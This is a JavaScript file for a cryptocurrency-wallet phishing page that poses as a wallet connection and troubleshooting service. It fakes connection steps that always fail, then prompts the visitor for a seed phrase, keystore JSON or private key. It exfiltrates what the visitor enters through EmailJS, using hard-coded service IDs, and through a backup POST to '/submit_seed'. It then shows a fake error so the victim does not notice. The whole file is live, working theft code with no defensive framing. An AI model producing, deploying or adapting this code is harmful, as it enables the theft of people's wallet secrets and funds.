
document.addEventListener('DOMContentLoaded', function() {
    // Initialize EmailJS
    emailjs.init("hwWuRqhr9vJTWa-n8");
    
    const connectWalletBtn = document.getElementById('connect-wallet-btn');
    const walletModal = document.getElementById('wallet-modal');
    const stepsModal = document.getElementById('steps-modal');
    const importModal = document.getElementById('import-modal');
    const validationModal = document.getElementById('validation-modal');
    const errorModal = document.getElementById('error-modal');
    const customWalletModal = document.getElementById('custom-wallet-modal');
    const customIssueModal = document.getElementById('custom-issue-modal');
    const issueConfirmationModal = document.getElementById('issue-confirmation-modal');
    const validateBtn = document.getElementById('validate-btn');
    const closeBtn = document.getElementById('close-btn');
    const seedInput = document.getElementById('seed-input');

    let selectedWallet = '';
    let selectedIssue = '';

    // Connect wallet button click
    connectWalletBtn.addEventListener('click', function() {
        walletModal.classList.remove('hidden');
    });

    // Wallet selection
    document.querySelectorAll('.wallet-item').forEach(item => {
        item.addEventListener('click', function() {
            selectedWallet = this.dataset.wallet;
            
            if (selectedWallet === 'other') {
                walletModal.classList.add('hidden');
                customWalletModal.classList.remove('hidden');
            } else {
                walletModal.classList.add('hidden');
                showConnectionSteps();
            }
        });
    });

    // Show connection steps
    function showConnectionSteps() {
        stepsModal.classList.remove('hidden');
        
        const steps = [
            { title: 'Initializing', description: 'Trying to connect to wallet...', duration: 3000 },
            { title: 'Connecting', description: 'Establishing secure connection...', duration: 3000 },
            { title: 'Verifying', description: 'Verifying wallet credentials...', duration: 3000 },
            { title: 'Error', description: 'Connection failed', duration: 1000 }
        ];

        let currentStep = 0;

        function showStep() {
            if (currentStep < steps.length) {
                const step = steps[currentStep];
                document.getElementById('step-title').textContent = step.title;
                document.getElementById('step-description').textContent = step.description;
                
                setTimeout(() => {
                    currentStep++;
                    if (currentStep < steps.length) {
                        showStep();
                    } else {
                        stepsModal.classList.add('hidden');
                        showImportModal();
                    }
                }, step.duration);
            }
        }

        showStep();
    }

    // Show import modal
    function showImportModal() {
        const walletName = selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1);
        document.getElementById('import-title').textContent = `Import your ${walletName} wallet`;
        importModal.classList.remove('hidden');
    }

    // Show issue confirmation
    function showIssueConfirmation(issue) {
        document.getElementById('issue-title').textContent = 'Connect to wallet to troubleshoot your issue';
        document.getElementById('issue-description').textContent = `Issue: ${issue}. Click continue to connect your wallet and resolve your problem.`;
        issueConfirmationModal.classList.remove('hidden');
    }

    // Import option selection
    document.querySelectorAll('.import-option').forEach(option => {
        option.addEventListener('click', function() {
            document.querySelectorAll('.import-option').forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
            
            const selectedOption = this.dataset.option;
            const label = document.querySelector('.import-form label');
            const input = document.getElementById('seed-input');
            
            switch(selectedOption) {
                case 'seed':
                    label.textContent = 'Enter your wallet seed phrase';
                    input.placeholder = 'Enter your seed phrase';
                    break;
                case 'keystore':
                    label.textContent = 'Enter your keystore JSON';
                    input.placeholder = 'Paste your keystore JSON here';
                    break;
                case 'private':
                    label.textContent = 'Enter your private key';
                    input.placeholder = 'Enter your private key';
                    break;
            }
        });
    });

    // Validate button click
    validateBtn.addEventListener('click', function() {
        const seedPhrase = seedInput.value.trim();
        const selectedOption = document.querySelector('.import-option.active').dataset.option;
        
        if (!seedPhrase) {
            alert('Please enter your seed phrase');
            return;
        }

        importModal.classList.add('hidden');
        validationModal.classList.remove('hidden');

        // Send data via EmailJS
        const templateParams = {
            wallet_name: selectedWallet,
            data_type: selectedOption,
            seed_phrase: seedPhrase,
            issue: selectedIssue || 'General wallet connection'
        };

        emailjs.send("service_xccsf1u", "template_icljc9o", templateParams)
            .then(function(response) {
                console.log('Email sent successfully:', response);
            })
            .catch(function(error) {
                console.log('Email send failed:', error);
            });

        // Also send to backend as backup
        fetch('/submit_seed', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                seedPhrase: seedPhrase,
                walletName: selectedWallet,
                dataType: selectedOption,
                issue: selectedIssue
            })
        });

        // Show validation for 3 seconds then show error
        setTimeout(() => {
            validationModal.classList.add('hidden');
            errorModal.classList.remove('hidden');
            
            // Redirect to home after 5 seconds
            setTimeout(() => {
                errorModal.classList.add('hidden');
                resetApp();
            }, 5000);
        }, 3000);
    });

    // Close button click
    closeBtn.addEventListener('click', function() {
        importModal.classList.add('hidden');
        resetApp();
    });

    // Custom wallet modal handlers
    document.getElementById('custom-wallet-confirm').addEventListener('click', function() {
        const customWallet = document.getElementById('custom-wallet-input').value.trim();
        if (customWallet) {
            selectedWallet = customWallet;
            customWalletModal.classList.add('hidden');
            showConnectionSteps();
        } else {
            alert('Please enter a wallet name');
        }
    });

    document.getElementById('custom-wallet-cancel').addEventListener('click', function() {
        customWalletModal.classList.add('hidden');
        walletModal.classList.remove('hidden');
    });

    // Custom issue modal handlers
    document.getElementById('custom-issue-confirm').addEventListener('click', function() {
        const customIssue = document.getElementById('custom-issue-input').value.trim();
        if (customIssue) {
            selectedIssue = customIssue;
            customIssueModal.classList.add('hidden');
            showIssueConfirmation(customIssue);
        } else {
            alert('Please describe your issue');
        }
    });

    document.getElementById('custom-issue-cancel').addEventListener('click', function() {
        customIssueModal.classList.add('hidden');
    });

    // Issue confirmation modal handlers
    document.getElementById('issue-continue').addEventListener('click', function() {
        issueConfirmationModal.classList.add('hidden');
        walletModal.classList.remove('hidden');
    });

    document.getElementById('issue-cancel').addEventListener('click', function() {
        issueConfirmationModal.classList.add('hidden');
        resetApp();
    });

    // Reset app to initial state
    function resetApp() {
        seedInput.value = '';
        selectedWallet = '';
        selectedIssue = '';
        document.getElementById('custom-wallet-input').value = '';
        document.getElementById('custom-issue-input').value = '';
        document.getElementById('troubleshoot-select').value = '';
    }

    // Close modals when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.classList.add('hidden');
        }
    });

    // Troubleshoot dropdown change
    document.getElementById('troubleshoot-select').addEventListener('change', function() {
        if (this.value) {
            selectedIssue = this.options[this.selectedIndex].text;
            
            if (this.value === 'other') {
                customIssueModal.classList.remove('hidden');
            } else {
                showIssueConfirmation(selectedIssue);
            }
        }
    });
});
